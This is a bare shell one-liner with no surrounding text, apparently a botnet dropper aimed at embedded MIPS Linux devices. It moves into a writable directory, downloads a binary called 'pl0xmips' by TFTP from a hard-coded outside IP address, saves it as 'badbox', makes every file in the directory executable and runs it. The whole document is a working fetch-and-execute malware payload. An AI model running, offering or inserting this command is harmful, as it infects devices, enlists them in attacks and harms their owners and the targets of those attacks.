cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pl0xmips -g 173.0.51.121;cat pl0xmips >badbox;chmod +x *;./badbox
